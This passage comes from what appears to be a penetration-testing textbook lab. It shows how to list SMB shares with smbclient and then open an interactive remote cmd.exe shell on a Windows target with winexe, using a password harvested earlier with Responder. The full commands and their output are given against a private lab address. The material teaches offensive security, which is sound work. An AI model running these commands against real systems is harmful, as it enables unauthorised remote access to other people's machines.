privileges to the system.

# Lab 10-2: Using Winexe to Access Remote Systems

We have a password to our victim system from using Responder, but how do we now interact with our victim system? Using Winexe is a common way for attackers to access remote systems. It uses named pipes through the hidden IPC share on the target system to create a management service. Once that service is created, we can connect to it and call commands as the service.

To verify that the target system is sharing the IPC share, we use smbclient to list the shares on the target system:

```
# smbclient -U User%Password1 -L 192.168.1.13
WARNING: The "syslog" option is deprecated
Domain=[DESKTOP-KRB3MSI] OS=[Windows 10 Enterprise 15063]
Server=[Windows 10 Enterprise 6.3]

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Users           Disk
Connection to 192.168.1.13 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
NetBIOS over TCP disabled -- no workgroup available
```

For many of the tools we use in the rest of this chapter, we’re going to see this common way of specifying the logon credentials for the target system. The format is <DOMAIN>\\<USERNAME>%<PASSWORD>. Here, we specified our user credentials as User%Password1, our username and password. The -L option asks smbclient to list the shares on the system. We can see that there are a number of shares, including our IPC$ share.

With knowledge that our IPC share is available, let’s see if we have the ability to launch a command prompt. We’ll use the same syntax for specifying the username, only this time, we’ll use the syntax //IP ADDRESS> to specify the target system. We also add the --uninstall flag, which will uninstall our service on exit. Finally, we specify cmd.exe for the cmd.exe application, which gives us an interactive shell on the target system.

```
# winexe -U User%Password1 --uninstall //192.168.1.13 cmd.exe
Microsoft Windows [Version 10.0.15063]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\\Windows\\system32>whoami
whoami
desktop-krb3msi\\user
```

We now see the Windows banner and command prompt, which means we succeeded. Next, we want to check our privilege level so that we can determine the rights we are